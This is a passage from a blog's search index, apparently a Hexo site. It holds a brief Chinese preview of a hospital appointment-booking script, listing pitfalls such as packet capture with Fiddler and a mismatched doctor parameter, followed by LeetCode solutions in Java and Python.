<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>写一个医院挂号脚本</title>
    <url>/2020/11/13/2020-11-13-guahao/</url>
    <content><![CDATA[<h1 id="半年没更新了-，"><a href="#半年没更新了-，" class="headerlink" title="半年没更新了=，="></a>半年没更新了=，=</h1><p>Hasn’t been updated for half a year.</p>
<p>I will update when I am free.</p>
<h1 id="预告"><a href="#预告" class="headerlink" title="预告"></a>预告</h1><p>上个月有个同学找我，说在某医院某医生抢了一年没挂到号。</p>
<p>分析完挂号的流程后，写了一个python脚本进行挂号。</p>
<p>中间踩了一些坑，之后有时间码出来。</p>
<p>坑：</p>
<ol>
<li>一开始分析挂号链接，发现是通过 <code>get</code> 来传参数，尝试换掉医生 <code>id</code>，由于 <code>PartTimeId</code> 参数仍是原医生的。所以导致挂号支付后，电子系统显示是更改后的医生，但实际短信发过来的信息仍是原医生。</li>
<li>微信小程序如何验证用户？</li>
<li><code>Cookie</code> 的获取流程？（还没有进一步的去做，因为微信的验证很麻烦，暂时没有找到帖子学习，也懒orz）</li>
<li>怎么抓包分析？开代理</li>
<li>代理具体怎么开？<code>Fiddler</code> 怎么用？</li>
<li><code>Http</code> 的 <code>Url</code> 加解码、UTF8加解码：<code>“无”UTF8编码成%u65E0，再url编码成%25u65E0</code></li>
<li>如何通过手机上的操作，分析每一个包定位到这个访问链</li>
</ol>
<p><img src="/2020/11/13/2020-11-13-guahao/image-20201113010105319.png" alt="image-20201113010105319"></p>
]]></content>
  </entry>
  <entry>
    <title>2020-10-21-leetcode-p1</title>
    <url>/2020/10/21/2020-10-21-leetcode-p1/</url>
    <content><![CDATA[<h1 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(target-nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;map.get(target-nums[i]),i&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                map.put(nums[i],i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="2-链表相加"><a href="#2-链表相加" class="headerlink" title="2. 链表相加"></a>2. 链表相加</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode dummy=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode head=dummy;</span><br><span class="line">        <span class="keyword">int</span> carry=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="keyword">null</span> || l2!=<span class="keyword">null</span> || carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                carry+=l1.val;</span><br><span class="line">                l1=l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                carry+=l2.val;</span><br><span class="line">                l2=l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            head.next=<span class="keyword">new</span> ListNode(carry%<span class="number">10</span>);</span><br><span class="line">            head=head.next;</span><br><span class="line">            carry=carry/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="4-两个正序数组的中位数"><a href="#4-两个正序数组的中位数" class="headerlink" title="4.两个正序数组的中位数"></a>4.两个正序数组的中位数</h1><p><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/median-of-two-sorted-arrays/</a></p>
<p>给定两个大小为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。</p>
<p>请你找出这两个正序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。</p>
<p>这道题其实可以扩展成，在O(log(m + n))    的时间复杂度内，找到第K大的数</p>
<ol>
<li><p>为了计算第K位的数，先判断两数组A、B在第k//2的数的大小，<em>如果A的该数比B大</em>，则可以判断，B在第K//2之前的数肯定不是我们要找的target，则把这些数删掉，将K减去K//2，继续递归遍历。</p>
</li>
<li><p>要处理一些边界条件：</p>
<p>我们需要始终保持A比B长。</p>
<p>当B长度为零时就可以直接返回，减少了递归深度。</p>
<p>如果寻找的K为排在第1位的数，则比较两数组的第1位数，并返回</p>
</li>
<li><p>对于中位数而言，我们可以分别计算第    length//2+1、length//2+2  的值</p>
<p>总长度奇数条件下，前者后者都是中间的值</p>
<p>总长度偶数条件下，前者是第一个中位数，后者是第二个。两者之均，正好是中位数的值</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span><span class="params">(self, nums1: List[int], nums2: List[int])</span> -&gt; float:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(nums1,nums2,k)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> len(nums1)&lt;len(nums2): </span><br><span class="line">                nums2,nums1=nums1,nums2</span><br><span class="line">            <span class="keyword">if</span> len(nums2)==<span class="number">0</span>: </span><br><span class="line">                <span class="keyword">return</span> nums1[k<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">if</span> k==<span class="number">1</span>: </span><br><span class="line">                <span class="keyword">return</span> min(nums1[<span class="number">0</span>],nums2[<span class="number">0</span>])</span><br><span class="line">            ksub=min(k//<span class="number">2</span>,len(nums2))</span><br><span class="line">            <span class="keyword">if</span> nums1[ksub<span class="number">-1</span>]&gt;=nums2[ksub<span class="number">-1</span>]: </span><br><span class="line">                <span class="keyword">return</span> helper(nums1,nums2[ksub:],k-ksub)</span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                <span class="keyword">return</span> helper(nums1[ksub:],nums2,k-ksub)</span><br><span class="line">        left=(len(nums1)+len(nums2)+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        right=(len(nums1)+len(nums2)+<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> (helper(nums1,nums2,left)+helper(nums1,nums2,right))/<span class="number">2</span></span><br></pre></td></tr></table></figure>



<p>其实上面的比较A、B的长度，并且交换，是可以避免的。</p>
<p>开局先判断两个数组是否为空，然后判断k==1</p>
<p>接下来就比较两数组的k//2的大小，来进一步缩小查找范围：</p>
<ul>
<li>只可能有一个数组的长度不到k//2，因为k从一开始就是被约束好的</li>
<li>如果B数组长度不为K/2，那么一定可以把A数组的前K/2个数去掉，因为这K/2个数必不是target</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span>[] nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left=(nums1.length+nums2.length+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> right=(nums1.length+nums2.length+<span class="number">2</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> (findKNum(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,left)+findKNum(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,right))/<span class="number">2.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKNum</span><span class="params">(<span class="keyword">int</span>[] nums1,<span class="keyword">int</span> i,<span class="keyword">int</span>[] nums2,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=nums1.length) <span class="keyword">return</span> nums2[j+k-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(j&gt;=nums2.length) <span class="keyword">return</span> nums1[i+k-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> Math.min(nums1[i],nums2[j]);<span class="comment">//两个数组此时都不为空</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> nums1mid=(i+k/<span class="number">2</span>-<span class="number">1</span>&lt;nums1.length)?nums1[i+k/<span class="number">2</span>-<span class="number">1</span>]:Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> nums2mid=(j+k/<span class="number">2</span>-<span class="number">1</span>&lt;nums2.length)?nums2[j+k/<span class="number">2</span>-<span class="number">1</span>]:Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">if</span>(nums1mid&lt;nums2mid)&#123;</span><br><span class="line">            <span class="keyword">return</span> findKNum(nums1,i+k/<span class="number">2</span>,nums2,j,k-k/<span class="number">2</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> findKNum(nums1,i,nums2,j+k/<span class="number">2</span>,k-k/<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-最长回文子串"><a href="#5-最长回文子串" class="headerlink" title="5.最长回文子串"></a>5.最长回文子串</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.length()&lt;<span class="number">2</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">int</span> maxLen=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[s.length()][s.length()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++) dp[i][i]=<span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//Arrays.fill(dp[0],true);</span></span><br><span class="line">        <span class="comment">//System.out.printf("%b,%b,%b",dp[0][1],dp[0][1],dp[0][1]);</span></span><br><span class="line">        <span class="comment">//System.out.println(dp[0][1]);</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;s.length();j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;j;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(i)==s.charAt(j))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j-i&lt;=<span class="number">2</span> || dp[i+<span class="number">1</span>][j-<span class="number">1</span>]==<span class="keyword">true</span>)&#123;</span><br><span class="line">                        dp[i][j]=<span class="keyword">true</span>;</span><br><span class="line">                        <span class="keyword">if</span>(maxLen&lt;j-i+<span class="number">1</span>)&#123;</span><br><span class="line">                            left=i;</span><br><span class="line">                            right=j;</span><br><span class="line">                            maxLen=j-i+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//System.out.printf("\n%d,%d,%d",1,i,j);</span></span><br><span class="line">                        <span class="comment">//System.out.printf("\n%d,%d,%d",left,right,maxLen);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(left,right+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="10-正则表达式匹配"><a href="#10-正则表达式匹配" class="headerlink" title="10. 正则表达式匹配"></a>10. 正则表达式匹配</h1><p><a href="https://leetcode-cn.com/problems/regular-expression-matching/" target="_blank" rel="noopener">10. 正则表达式匹配</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// return text.matches("^"+pattern+"$");</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String text, String pattern)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] str=text.toCharArray();</span><br><span class="line">        <span class="keyword">char</span>[] ptr=pattern.toCharArray();</span><br><span class="line">        <span class="keyword">boolean</span>[][] dp=<span class="keyword">new</span> <span class="keyword">boolean</span>[str.length+<span class="number">1</span>][ptr.length+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;ptr.length+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(ptr[j-<span class="number">1</span>]==<span class="string">'*'</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j&gt;<span class="number">1</span>) dp[i][j]=dp[i][j-<span class="number">2</span>]; <span class="comment">//*匹配为空，这是很重要的初始化步骤</span></span><br><span class="line">                    <span class="comment">//*匹配一个到多个字符，最后会落到空上</span></span><br><span class="line">                    <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; (str[i-<span class="number">1</span>]==ptr[j-<span class="number">2</span>] || ptr[j-<span class="number">2</span>]==<span class="string">'.'</span>)) dp[i][j]=dp[i][j] | dp[i-<span class="number">1</span>][j];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//正常匹配</span></span><br><span class="line">                    <span class="keyword">if</span>(i&gt;<span class="number">0</span>  &amp;&amp; (str[i-<span class="number">1</span>]==ptr[j-<span class="number">1</span>] || ptr[j-<span class="number">1</span>]==<span class="string">'.'</span>)) dp[i][j]=dp[i][j] | dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[str.length][ptr.length];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="11-盛水最多的容器"><a href="#11-盛水最多的容器" class="headerlink" title="11.盛水最多的容器"></a>11.盛水最多的容器</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=height.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            res=Math.max(res,Math.min(height[i],height[j])*(j-i));</span><br><span class="line">            <span class="keyword">if</span>(height[i]&lt;height[j])&#123;</span><br><span class="line">                i+=<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                j-=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a>15. 三数之和</h1><p><a href="https://leetcode-cn.com/problems/3sum/" target="_blank" rel="noopener">15. 三数之和</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res=<span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">int</span> len=nums.length;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span> || len&lt;<span class="number">3</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;<span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span> &amp;&amp; nums[i]==nums[i-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">int</span> left=i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> right=len-<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                <span class="keyword">int</span> sum=nums[i]+nums[left]+nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">                    res.add(Arrays.asList(nums[i],nums[left],nums[right]));</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;right &amp;&amp; nums[left]==nums[left+<span class="number">1</span>]) left++;</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;right &amp;&amp; nums[right]==nums[right-<span class="number">1</span>]) right--;</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17. 电话号码的字母组合"></a>17. 电话号码的字母组合</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">letterCombinations</span><span class="params">(self, digits: str)</span> -&gt; List[str]:</span></span><br><span class="line">        <span class="keyword">if</span> len(digits)==<span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">        res=[]</span><br><span class="line">        tmp=[]</span><br><span class="line">        d=&#123;<span class="string">'2'</span>: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>],</span><br><span class="line">               <span class="string">'3'</span>: [<span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>],</span><br><span class="line">               <span class="string">'4'</span>: [<span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>],</span><br><span class="line">               <span class="string">'5'</span>: [<span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>],</span><br><span class="line">               <span class="string">'6'</span>: [<span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>],</span><br><span class="line">               <span class="string">'7'</span>: [<span class="string">'p'</span>, <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>],</span><br><span class="line">               <span class="string">'8'</span>: [<span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>],</span><br><span class="line">               <span class="string">'9'</span>: [<span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]&#125;</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">traceback</span><span class="params">(digits,index)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> index==len(digits):</span><br><span class="line">                res.append(<span class="string">""</span>.join(tmp))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            dt=d[digits[index]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dt)):</span><br><span class="line">                tmp.append(dt[i])</span><br><span class="line">                traceback(digits,index+<span class="number">1</span>)</span><br><span class="line">                tmp.pop()</span><br><span class="line">        traceback(digits,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<p><strong>Java</strong></p>
<p><a href="https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number/" target="_blank" rel="noopener">17. 电话号码的字母组合</a></p>
<p>回溯法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">letterCombinations</span><span class="params">(String digits)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="keyword">null</span> || digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Character, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">'2'</span>, <span class="string">"abc"</span>);</span><br><span class="line">        map.put(<span class="string">'3'</span>, <span class="string">"def"</span>);</span><br><span class="line">        map.put(<span class="string">'4'</span>, <span class="string">"ghi"</span>);</span><br><span class="line">        map.put(<span class="string">'5'</span>, <span class="string">"jkl"</span>);</span><br><span class="line">        map.put(<span class="string">'6'</span>, <span class="string">"mno"</span>);</span><br><span class="line">        map.put(<span class="string">'7'</span>, <span class="string">"pqrs"</span>);</span><br><span class="line">        map.put(<span class="string">'8'</span>, <span class="string">"tuv"</span>);</span><br><span class="line">        map.put(<span class="string">'9'</span>, <span class="string">"wxyz"</span>);</span><br><span class="line">        backTrack(list, digits, map, <span class="number">0</span>, <span class="keyword">new</span> StringBuilder());</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">backTrack</span><span class="params">(List&lt;String&gt; list, String digits, Map&lt;Character, String&gt; map, <span class="keyword">int</span> index, StringBuilder sb)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sb.length() == digits.length()) &#123;</span><br><span class="line">            list.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String value = map.get(digits.charAt(index));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; value.length(); j++) &#123;</span><br><span class="line">            backTrack(list, digits, map, index + <span class="number">1</span>, sb.append(value.charAt(j)));</span><br><span class="line">            sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>队列法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">letterCombinations</span><span class="params">(String digits)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="keyword">null</span> || digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Character, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">'2'</span>, <span class="string">"abc"</span>);</span><br><span class="line">        map.put(<span class="string">'3'</span>, <span class="string">"def"</span>);</span><br><span class="line">        map.put(<span class="string">'4'</span>, <span class="string">"ghi"</span>);</span><br><span class="line">        map.put(<span class="string">'5'</span>, <span class="string">"jkl"</span>);</span><br><span class="line">        map.put(<span class="string">'6'</span>, <span class="string">"mno"</span>);</span><br><span class="line">        map.put(<span class="string">'7'</span>, <span class="string">"pqrs"</span>);</span><br><span class="line">        map.put(<span class="string">'8'</span>, <span class="string">"tuv"</span>);</span><br><span class="line">        map.put(<span class="string">'9'</span>, <span class="string">"wxyz"</span>);</span><br><span class="line">        backTrack(list, digits, map, <span class="number">0</span>, <span class="keyword">new</span> StringBuilder());</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">backTrack</span><span class="params">(List&lt;String&gt; list, String digits, Map&lt;Character, String&gt; map, <span class="keyword">int</span> index, StringBuilder sb)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sb.length() == digits.length()) &#123;</span><br><span class="line">            list.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String value = map.get(digits.charAt(index));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; value.length(); j++) &#123;</span><br><span class="line">            backTrack(list, digits, map, index + <span class="number">1</span>, sb.append(value.charAt(j)));</span><br><span class="line">            sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="19-删除链表的倒数第N个节点"><a href="#19-删除链表的倒数第N个节点" class="headerlink" title="19. 删除链表的倒数第N个节点"></a>19. 删除链表的倒数第N个节点</h1><p>在处理的时候，可以使用哑巴节点，</p>
<ul>
<li>来规避链表只有一个节点的情况，</li>
<li>并且可以保持在 <code>target</code> 前一位，用于删除节点</li>
</ul>
<p>然后，想摘掉快节点移动的步数，其实是有组合的：</p>
<ul>
<li>如果快节点只先移动 <code>k-1</code> 步，那么我们在一起移动时，需要时刻注意 <code>f.next</code> 是否为空</li>
<li>如果快节点只先移动 <code>k</code> 步，那么我们在一起移动时，需要时刻注意 <code>f</code> 是否为空</li>
</ul>
<p><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">删除链表的倒数第N个节点</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode f=head;</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">1</span> &amp;&amp; f.next!=<span class="keyword">null</span>)&#123;<span class="comment">//快指针</span></span><br><span class="line">            f=f.next;</span><br><span class="line">            n=n-<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode res=<span class="keyword">new</span> ListNode(<span class="number">0</span>);<span class="comment">//哑巴节点</span></span><br><span class="line">        res.next=head;</span><br><span class="line">        ListNode tmp=res;<span class="comment">//tmp用于移动，删除</span></span><br><span class="line">        <span 